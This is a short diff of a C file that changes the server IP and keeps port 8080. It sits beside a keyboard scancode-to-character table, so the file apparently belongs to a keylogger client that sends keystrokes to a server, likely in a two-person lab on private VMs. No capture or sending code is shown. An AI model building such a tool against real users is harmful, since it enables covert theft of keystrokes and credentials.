@@ -12,8 +12,8 @@
 
 #define PORT 8080
 // Server address will depend on your VM
-#define ADDRESS "10.0.2.15" // Uwem's server VM
-//#define ADDRESS "192.168.56.101" //Alvin's Server VM
+// #define ADDRESS "10.0.2.15" // Uwem's server VM
+#define ADDRESS "192.168.56.101" //Alvin's Server VM
 #define SA struct sockaddr
 
 char *keys = "__1234567890-=__qwertyuiop[]__asdfghjkl;'___zxcvbnm,./";
